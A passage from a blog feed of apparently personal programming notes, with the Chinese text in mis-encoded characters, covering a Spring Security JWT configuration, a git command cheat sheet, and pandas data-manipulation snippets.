class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">configure</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">//ä½¿ç”¨JWTï¼Œä¸éœ€è¦csrfï¼Œå…³é—­csrfé˜²èŒƒ</span></span><br><span class="line">    http</span><br><span class="line">            .csrf().disable()</span><br><span class="line">            <span class="comment">//åŸºäºtokenï¼Œä¸éœ€è¦session</span></span><br><span class="line">            .sessionManagement()</span><br><span class="line">            .sessionCreationPolicy(SessionCreationPolicy.STATELESS)</span><br><span class="line">            .and()</span><br><span class="line">            <span class="comment">//æˆæƒè®¤è¯</span></span><br><span class="line">            .authorizeRequests()</span><br><span class="line">            <span class="comment">//æ‰€æœ‰è¯·æ±‚éƒ½è¦æ±‚è®¤è¯,å¿…é¡»ç™»å½•åè¢«è®¿é—®</span></span><br><span class="line">            .anyRequest().authenticated()</span><br><span class="line">            <span class="comment">//åŠ¨æ€æƒé™é…ç½®</span></span><br><span class="line">            .withObjectPostProcessor(<span class="keyword">new</span> <span class="title class_">ObjectPostProcessor</span>&lt;FilterSecurityInterceptor&gt;() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> &lt;O <span class="keyword">extends</span> <span class="title class_">FilterSecurityInterceptor</span>&gt; O <span class="title function_">postProcess</span><span class="params">(O object)</span> &#123;</span><br><span class="line">                    object.setAccessDecisionManager(customUrlDecisionManager);</span><br><span class="line">                    object.setSecurityMetadataSource(customFilter);</span><br><span class="line">                    <span class="keyword">return</span> object;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">            .and()</span><br><span class="line">            <span class="comment">//ç¦ç”¨ç¼“å­˜</span></span><br><span class="line">            .headers()</span><br><span class="line">            .cacheControl();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ·»åŠ jwt ç™»å½•æˆæƒè¿‡æ»¤å™¨</span></span><br><span class="line">    http.addFilterBefore(jwtAuthencationTokenFilter(), UsernamePasswordAuthenticationFilter.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å¼‚å¸¸å¤„ç†</span></span><br><span class="line">    <span class="comment">// æ·»åŠ è‡ªå®šä¹‰æœªæˆæƒå’Œæœªç™»å½•ç»“æœè¿”å›</span></span><br><span class="line">    http.exceptionHandling()</span><br><span class="line">            .accessDeniedHandler(restfulAccessDeniedHandler)</span><br><span class="line">            .authenticationEntryPoint(restAuthorizationEntryPoint);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> é¢ç» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gitæ“ä½œ</title>
      <link href="/2022/04/22/git/"/>
      <url>/2022/04/22/git/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C">åŸºæœ¬æ“ä½œ</a></li><li><a href="#%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6">ç‰ˆæœ¬æ§åˆ¶</a></li><li><a href="#%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93">è¿œç¨‹ä»“åº“</a></li><li><a href="#%E5%88%86%E6%94%AF">åˆ†æ”¯</a></li><li><a href="#%E6%A0%87%E7%AD%BErelease-%E5%8F%91%E8%A1%8C%E7%89%88">æ ‡ç­¾Release å‘è¡Œç‰ˆ</a></li><li><a href="#idea">Idea</a></li></ul><!-- tocstop --><h2><span id="åŸºæœ¬æ“ä½œ">åŸºæœ¬æ“ä½œ</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">git init <span class="comment"># æ–°å»ºgitä»“åº“</span></span><br><span class="line">git add &lt;filename/directory/.&gt; <span class="comment"># å°†å·¥ä½œåŒºçš„æ–‡ä»¶ã€ç›®å½•ã€æ‰€æœ‰æ–‡ä»¶æ·»åŠ åˆ°stage</span></span><br><span class="line">git commit -m <span class="string">&quot;commit&quot;</span> <span class="comment"># å°†stageçš„æ–‡ä»¶æ·»åŠ åˆ°ç‰ˆæœ¬åº“ä¸­</span></span><br><span class="line">git commit -am <span class="string">&quot;commit&quot;</span> <span class="comment"># ä¸Šä¸¤æ­¥åˆäºŒä¸ºä¸€</span></span><br><span class="line">git commit -a <span class="comment"># æ›´åŠ ç®€åŒ–</span></span><br><span class="line">git status <span class="comment"># æŸ¥çœ‹gitçŠ¶æ€</span></span><br><span class="line">git <span class="built_in">log</span> <span class="comment"># æŸ¥çœ‹æäº¤æ—¥å¿—</span></span><br><span class="line">git <span class="built_in">log</span> 5 --pretty=oneline <span class="comment"># æ–¹ä¾¿æŸ¥çœ‹æ—¥å¿—</span></span><br><span class="line">git diff <span class="comment"># æŸ¥çœ‹åŒºåˆ«</span></span><br><span class="line">git <span class="built_in">rm</span> filename <span class="comment"># åˆ é™¤æ–‡ä»¶</span></span><br><span class="line">git ls-files <span class="comment"># æŸ¥çœ‹æœ¬åœ°ä»“åº“æ–‡ä»¶</span></span><br></pre></td></tr></table></figure><h2><span id="ç‰ˆæœ¬æ§åˆ¶">ç‰ˆæœ¬æ§åˆ¶</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git reset HEAD <span class="comment"># å°†stageä¸­çš„æ–‡ä»¶æ¸…ç©ºï¼ˆæ’¤é”€git addæ“ä½œï¼‰</span></span><br><span class="line">git reset --hard HEAD^^ <span class="comment"># æ‰€æœ‰åŒºåŸŸå›é€€åˆ°ä¸Šä¸Šä¸ªç‰ˆæœ¬ å–å†³äº^çš„æ•°é‡</span></span><br><span class="line">git reset --hard HEAD~1 <span class="comment"># å›é€€ä¸€ä¸ªç‰ˆæœ¬</span></span><br><span class="line">git reset --hard æ ‡è¯†ç¬¦ <span class="comment"># å›é€€åˆ°æŸä¸ªç‰ˆæœ¬ï¼Œè¾“å…¥5ä½+ï¼Œä¸é‡å¤å³å¯</span></span><br><span class="line">git reflog <span class="comment"># æŸ¥çœ‹ä¹‹å‰çš„å¼•ç”¨ä½ç½®ï¼Œé˜²æ­¢æ— æ³•å›æ»š</span></span><br><span class="line"></span><br><span class="line">git checkout --filename <span class="comment">#æ¢å¤å·²æäº¤çš„è¯¯åˆ é™¤å·¥ä½œåŒºçš„æ–‡ä»¶</span></span><br></pre></td></tr></table></figure><h2><span id="è¿œç¨‹ä»“åº“">è¿œç¨‹ä»“åº“</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> url <span class="comment"># ä¸‹è½½è¿œç¨‹ä»“åº“é¡¹ç›®</span></span><br><span class="line">git push origin branch <span class="comment"># æ¨é€æœ¬åœ°åˆ†æ”¯åˆ°è¿œç¨‹</span></span><br><span class="line">git push origin :remote_branch <span class="comment"># åˆ é™¤è¿œç¨‹åˆ†æ”¯</span></span><br><span class="line">git checkout -b local_branch origin/remote_branch <span class="comment"># æ‹‰å–è¿œç¨‹æŒ‡å®šåˆ†æ”¯å¹¶åœ¨æœ¬åœ°åˆ›å»ºåˆ†æ”¯</span></span><br><span class="line">git fetch <span class="comment"># è·å–åˆ†æ”¯</span></span><br><span class="line">git pull <span class="comment"># æ‹‰å–æœ€æ–°å†…å®¹</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span><span class="string">&#x27;å¤šäººåä½œ&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># æäº¤å‰å…ˆpull</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="åˆ†æ”¯">åˆ†æ”¯</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git checkout branch <span class="comment"># åˆ‡æ¢åˆ°æŒ‡å®šåˆ†æ”¯</span></span><br><span class="line">git checkout -b new_branch <span class="comment"># æ–°å»ºåˆ†æ”¯å¹¶åˆ‡æ¢åˆ°æ–°å»ºåˆ†æ”¯</span></span><br><span class="line">git branch -d branch <span class="comment"># åˆ é™¤æŒ‡å®šåˆ†æ”¯</span></span><br><span class="line">git branch <span class="comment"># æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯ *ä»£è¡¨ç›®å‰åˆ†æ”¯</span></span><br><span class="line">git branch -m oldBranch newBranch é‡å‘½ååˆ†æ”¯</span><br><span class="line">git branch -a <span class="comment"># æŸ¥çœ‹æœ¬åœ°å’Œè¿œç¨‹åˆ†æ”¯</span></span><br></pre></td></tr></table></figure><h2><span id="æ ‡ç­¾release-å‘è¡Œç‰ˆ">æ ‡ç­¾Release å‘è¡Œç‰ˆ</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git tag tagName <span class="comment"># æ–°å»ºæ ‡ç­¾ é»˜è®¤ä¸ºHEAD</span></span><br><span class="line">git tage -a tag_name -m <span class="string">&#x27;xx&#x27;</span> <span class="comment"># æ·»åŠ æ ‡ç­¾å¹¶æŒ‡å®šæè¿°ä¿¡æ¯</span></span><br><span class="line">git tag <span class="comment"># æŸ¥çœ‹æ‰€æœ‰æ ‡ç­¾</span></span><br><span class="line">git tag -d tag_name <span class="comment"># åˆ é™¤æœ¬åœ°æ ‡ç­¾</span></span><br><span class="line">git push origin tag_name <span class="comment"># æ¨é€æœ¬åœ°æ ‡ç­¾åˆ°è¿œç¨‹</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="idea">Idea</span></h2><ul><li>ä¸‹è½½æ’ä»¶.ignore</li></ul>]]></content>
      
      
      <categories>
          
          <category> é¢è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PandasåŸºç¡€</title>
      <link href="/2022/04/13/Pandas/"/>
      <url>/2022/04/13/Pandas/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#%E6%95%B0%E6%8D%AE%E8%AF%BB%E5%8F%96%E5%A4%84%E7%90%86">æ•°æ®è¯»å–å¤„ç†</a><ul><li><a href="#%E9%80%89%E6%8B%A9%E5%88%97">é€‰æ‹©åˆ—</a></li><li><a href="#%E9%80%89%E6%8B%A9%E8%A1%8C">é€‰æ‹©è¡Œ</a></li></ul></li><li><a href="#%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E5%8C%96">æ•°æ®æ ¼å¼åŒ–</a></li><li><a href="#%E6%97%A5%E6%9C%9F">æ—¥æœŸ</a></li><li><a href="#crud">CRUD</a><ul><li><a href="#%E5%88%97%E6%93%8D%E4%BD%9C">åˆ—æ“ä½œ</a></li><li><a href="#%E8%A1%8C%E6%93%8D%E4%BD%9C">è¡Œæ“ä½œ</a></li></ul><ul><li><a href="#create">Create</a></li><li><a href="#del">Del</a></li><li><a href="#update">Update</a></li><li><a href="#retrieve">Retrieve</a></li></ul></li><li><a href="#%E4%BF%9D%E5%AD%98%E6%96%87%E4%BB%B6">ä¿å­˜æ–‡ä»¶</a></li><li><a href="#tricks">Tricks</a></li><li><a href="#matplotlib">matplotlib</a></li><li><a href="#tips">Tips</a><ul><li><a href="#%E5%B1%8F%E8%94%BD%E6%8F%90%E9%86%92">å±è”½æé†’</a></li><li><a href="#%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87">æ˜¾ç¤ºä¸­æ–‡</a></li><li><a href="#%E5%85%B3%E4%BA%8Eiloc%E5%92%8C%E9%80%89%E6%8B%A9%E8%B5%8B%E5%80%BC%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98">å…³äºilocå’Œ[]é€‰æ‹©èµ‹å€¼å¤±è´¥é—®é¢˜</a></li></ul></li></ul><!-- tocstop --><h2><span id="æ•°æ®è¯»å–å¤„ç†">æ•°æ®è¯»å–å¤„ç†</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">iris = load_iris()</span><br><span class="line">lable = iris.feature_names</span><br><span class="line">target = iris.target</span><br><span class="line">feature = iris.data</span><br><span class="line">data = np.column_stack((feature,target))</span><br><span class="line">lable.append(<span class="string">&#x27;type&#x27;</span>)</span><br><span class="line">df = pd.DataFrame(data,columns=lable)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.reshape(-<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">a[:,np.newaxis]</span><br></pre></td></tr></table></figure><h3><span id="é€‰æ‹©åˆ—">é€‰æ‹©åˆ—</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tr.select_dtypes(include=[<span class="string">&#x27;int64&#x27;</span>,<span class="string">&#x27;float64&#x27;</span>])</span><br></pre></td></tr></table></figure><h3><span id="é€‰æ‹©è¡Œ">é€‰æ‹©è¡Œ</span></h3><ul><li>å¯ä»¥é€šè¿‡ â€œ.â€  æ¥æ“ä½œ <code>df.a</code></li><li>ä¹Ÿå¯ä»¥é€šè¿‡ â€œ[]â€ æ¥æ“ä½œ <code>df[&#39;a&#39;]</code></li></ul><h2><span id="æ•°æ®æ ¼å¼åŒ–">æ•°æ®æ ¼å¼åŒ–</span></h2><ol><li>mapã€applyåœ¨ç”¨äºSeriesæ—¶ï¼Œå¯¹æ¯ä¸€ä¸ªå€¼è¿›è¡Œå¤„ç†ï¼Œä¸¤è€…å¹¶æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«</li><li>applyä¸ä»…å¯ä»¥ç”¨äºSeriesï¼Œè¿˜å¯ä»¥ç”¨äºDataFrameï¼›è€Œmapåªèƒ½ç”¨äºSeriesã€‚</li><li>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œapplyåº”ç”¨æ›´å¹¿æ³›ï¼Œå°¤å…¶æ˜¯è‡ªå®šä¹‰å‡½æ•°å¸¦å¤šä¸ªå‚æ•°æ—¶ï¼Œå»ºè®®ä½¿ç”¨applyã€‚</li><li>applymapå¯ä»¥å¯¹å¤šä¸ªSeriesè¿›è¡Œæ“ä½œï¼Œmapå’Œapplyå‡ä¸è¡Œã€‚</li></ol><ul><li><p><strong>apply &#x2F;map&#x2F;applymap</strong>  å‡½æ•°ï¼ˆå¸¸ç”¨æ–¹æ³•ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cal_interval</span>(<span class="params">df,from_date,to_date</span>):</span><br><span class="line">    delta = <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f = datetime.datetime.strptime(df[from_date],<span class="string">&quot;%m/%d/%Y&quot;</span>)</span><br><span class="line">        t = datetime.datetime.strptime(df[to_date],<span class="string">&quot;%m/%d/%Y&quot;</span>)</span><br><span class="line">        delta = (t-f).days</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> <span class="keyword">if</span> delta&lt;=<span class="number">0</span> <span class="keyword">else</span> delta</span><br><span class="line">  df[<span class="string">&#x27;d&#x27;</span>] = df.apply(cal_interval,axis=<span class="number">1</span>,args=[<span class="string">&#x27;Date Event Began&#x27;</span>,<span class="string">&#x27;Date of Restoration&#x27;</span>])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">date = pd.period_range(start = <span class="string">&#x27;1990-02-01&#x27;</span>,periods=<span class="number">100</span>,freq=<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">df = pd.DataFrame(&#123;<span class="string">&#x27;date&#x27;</span>:date,<span class="string">&#x27;val&#x27;</span>:np.random.randn(<span class="built_in">len</span>(date)),<span class="string">&#x27;val2&#x27;</span>:np.random.randn(<span class="built_in">len</span>(date))&#125;)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="right"></th><th align="right">date</th><th align="right">val</th><th>val2</th></tr></thead><tbody><tr><td align="right">0</td><td align="right">1990-02-01</td><td align="right">0.771114</td><td>0.223646</td></tr><tr><td align="right">1</td><td align="right">1990-02-02</td><td align="right">-0.630781</td><td>-1.231217</td></tr><tr><td align="right">2</td><td align="right">1990-02-03</td><td align="right">-0.435648</td><td>-1.324931</td></tr><tr><td align="right">3</td><td align="right">1990-02-04</td><td align="right">2.459657</td><td>1.195601</td></tr><tr><td align="right">4</td><td align="right">1990-02-05</td><td align="right">0.378009</td><td>2.207286</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># applyé»˜è®¤æ˜¯ä½œç”¨äºåˆ—ï¼Œè¦ä½œç”¨äºè¡Œçš„è¯éœ€è¦åŠ ä¸Šaxis=1</span></span><br><span class="line">q2.apply(<span class="keyword">lambda</span> x:x.åŸä»·==x.å®ä»·,axis=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># ä¿ç•™ä¸¤ä½å°æ•°ï¼ˆç±»å‹å˜æˆObjectï¼‰</span></span><br><span class="line">df.val.apply(<span class="keyword">lambda</span> x: <span class="built_in">format</span>(x,<span class="string">&#x27;.2f&#x27;</span>))</span><br><span class="line"><span class="comment"># æˆ–è€…</span></span><br><span class="line">df.val.apply(<span class="keyword">lambda</span> x: <span class="string">&#x27;&#123;:.2f&#125;&#x27;</span>.<span class="built_in">format</span>(x))</span><br><span class="line"><span class="comment"># å››èˆäº”å…¥ä¿ç•™ä¸¤ä½å°æ•°</span></span><br><span class="line">df.val.<span class="built_in">round</span>(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è½¬ä¸ºç™¾åˆ†æ¯”ï¼Œå¹¶ä¿ç•™2ä½å°æ•° lambda å†™æ³•</span></span><br><span class="line">df.val.<span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="string">&quot;&#123;:.2%&#125;&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line"><span class="comment"># æˆ–è€…</span></span><br><span class="line">q2_df[col].apply(<span class="keyword">lambda</span> x:<span class="built_in">format</span>(x,<span class="string">&#x27;.2%&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ­£å¸¸å‡½æ•°å†™æ³•ï¼ˆä¸æ¨èï¼‰</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">turn_percentage</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;%.2f%%&#x27;</span> % (x * <span class="number">100</span>);</span><br><span class="line">df.val.apply(turn_percentage)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†è·å¥–æ—¶é—´æ ¼å¼åŒ–ä¸ºxæœˆxæ—¥</span></span><br><span class="line">df.date.apply(<span class="keyword">lambda</span> x:x.strftime(<span class="string">&#x27;%mæœˆ%dæ—¥&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†Seriesä¸­çš„æ•°æ®å’Œå­—ç¬¦æ‹¼æ¥</span></span><br><span class="line">df.val.apply(<span class="keyword">lambda</span> x: <span class="string">f&#x27;éšæœºæ•°ï¼š <span class="subst">&#123;x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># applymapå¯ä»¥å¯¹å¤šä¸ªSeriesè¿›è¡Œæ“ä½œ</span></span><br><span class="line">df[[<span class="string">&#x27;val&#x27;</span>,<span class="string">&#x27;val1&#x27;</span>]].applymap(<span class="keyword">lambda</span> x:<span class="built_in">format</span>(x,<span class="string">&#x27;.2f&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ„å»ºapplyå‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">judge_state</span>(<span class="params">row</span>):</span><br><span class="line">    <span class="keyword">if</span> row[<span class="string">&#x27;Austin - EV&#x27;</span>] &lt;=<span class="number">0.01</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Off&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> row[<span class="string">&#x27;Austin - EV&#x27;</span>]&gt;<span class="number">0.01</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;On&#x27;</span></span><br><span class="line"><span class="comment"># åº”ç”¨applyå‡½æ•°</span></span><br><span class="line">df_Austin_ev = df.apply(judge_state,axis = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># mapä¼ å…¥å­—å…¸ å…¶ä½™å€¼å‡å˜ä¸ºNaN</span></span><br><span class="line">df1 = pd.DataFrame(&#123;<span class="string">&#x27;A&#x27;</span>:[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>]&#125;)</span><br><span class="line">df1.A=df1.A.<span class="built_in">map</span>(&#123;<span class="string">&#x27;a&#x27;</span>:<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;b&#x27;</span>:<span class="string">&#x27;B&#x27;</span>&#125;) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># dfä½¿ç”¨applyè¿˜å¯ä»¥ä¼ å…¶ä»–å‚</span></span><br><span class="line"><span class="keyword">import</span> statsmodels.api <span class="keyword">as</span> sm</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">regress</span>(<span class="params">data, yvar, xvars</span>):</span><br><span class="line">    Y = data[yvar]</span><br><span class="line">    X = data[xvars]</span><br><span class="line">    X[<span class="string">&#x27;intercept&#x27;</span>] = <span class="number">1.</span></span><br><span class="line">    result = sm.OLS(Y, X).fit()</span><br><span class="line">    <span class="keyword">return</span> result.params</span><br><span class="line">  </span><br><span class="line">by_year.apply(regress, <span class="string">&#x27;AAPL&#x27;</span>, [<span class="string">&#x27;SPX&#x27;</span>])</span><br></pre></td></tr></table></figure></li><li><p>groupbyåçš„apply</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ•°æ®æ˜¯tg_id,month,q1-q96,æ±‚æ¯ä¸ªæœˆq1-q96ä¸­æœ€å¤§çš„ç‚¹</span></span><br><span class="line"><span class="comment"># æ³•1</span></span><br><span class="line">df.groupby([<span class="string">&#x27;tg_id&#x27;</span>,<span class="string">&#x27;month&#x27;</span>]).apply(<span class="keyword">lambda</span> x:<span class="built_in">max</span>(x.drop([<span class="string">&#x27;tg_id&#x27;</span>,<span class="string">&#x27;month&#x27;</span>],axis=<span class="number">1</span>).apply(<span class="keyword">lambda</span> x:<span class="built_in">max</span>(x))))</span><br><span class="line"><span class="comment"># æ³• 2</span></span><br><span class="line">df.groupby([<span class="string">&#x27;tg_id&#x27;</span>,<span class="string">&#x27;month&#x27;</span>]).apply(<span class="keyword">lambda</span> x:x.drop([<span class="string">&#x27;tg_id&#x27;</span>,<span class="string">&#x27;month&#x27;</span>],axis=<span class="number">1</span>).apply(<span class="keyword">lambda</span> x:<span class="built_in">max</span>(x,axis=<span class="number">1</span>))).reset_index().groupby([<span class="string">&#x27;tg_id&#x27;</span>,<span class="string">&#x27;month&#x27;</span>]).apply(<span class="keyword">lambda</span> x:x.drop([<span class="string">&#x27;tg_id&#x27;</span>,<span class="string">&#x27;month&#x27;</span>],axis=<span class="number">1</span>).apply(<span class="keyword">lambda</span> x:<span class="built_in">max</span>(x)))</span><br><span class="line"><span class="comment"># æ³•3</span></span><br><span class="line">val = [<span class="string">f&#x27;p<span class="subst">&#123;i&#125;</span>&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">97</span>)]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cal_min</span>(<span class="params">df</span>):</span><br><span class="line">  <span class="keyword">return</span> df[val].<span class="built_in">min</span>().<span class="built_in">min</span>()</span><br><span class="line">q4.groupby([<span class="string">&#x27;tg_id&#x27;</span>,<span class="string">&#x27;month&#x27;</span>]).apply(cal_max)</span><br><span class="line"><span class="comment"># æ³•4</span></span><br><span class="line">q4.groupby([<span class="string">&#x27;tg_id&#x27;</span>,<span class="string">&#x27;month&#x27;</span>]).apply(<span class="keyword">lambda</span> x:x[val].<span class="built_in">max</span>().<span class="built_in">max</span>())</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>å°†å«æœ‰ç©ºç™½ç¬¦çš„åˆ—è½¬float</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.a.replace(<span class="string">r&#x27;^\s*$&#x27;</span>, np.nan, regex=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></li></ul><h2><span id="æ—¥æœŸ">æ—¥æœŸ</span></h2><ul><li>å°†æ—¥çš„æ•°æ®è½¬ä¸ºä»¥æœˆä¸ºç»Ÿè®¡çš„æ•°æ®</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æå–æ—¥æœŸä¸­çš„date</span></span><br><span class="line">df[<span class="string">&#x27;date&#x27;</span>].dt.date</span><br><span class="line"><span class="comment"># é‡é‡‡æ · ç»Ÿè®¡</span></span><br><span class="line">df.resample(<span class="string">&#x27;D&#x27;</span>).count()</span><br><span class="line"><span class="comment">#é‡é‡‡æ · é€ä¸ªæ˜¾ç¤º</span></span><br><span class="line">df.to_period(<span class="string">&quot;M&quot;</span>)</span><br><span class="line"><span class="comment"># å¼‚å½¢æ—¥æœŸè½¬æ¢</span></span><br><span class="line">pd.to_datetime(work_index[<span class="string">&#x27;æ—¥æœŸ&#x27;</span>],<span 